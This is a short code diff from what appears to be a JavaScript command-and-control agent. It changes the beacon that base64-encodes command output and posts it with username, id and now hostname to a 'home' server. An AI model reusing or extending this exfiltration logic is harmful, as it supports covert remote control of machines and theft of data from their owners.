@@ -250,7 +250,7 @@ function main()
       if(retval == "") {
         retval = "[*] No results to return or error getting result data"
       }
-      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","'+rettype+'":"'+b64e(retval)+'"}';
+      var resp = '{"type": "'+type+'", "id": '+id+', "un":"'+un+'", "hn":"'+hn+'", "'+rettype+'":"'+b64e(retval)+'"}';
       jsObject.cmnd = ""
       post(home, resp)
     }
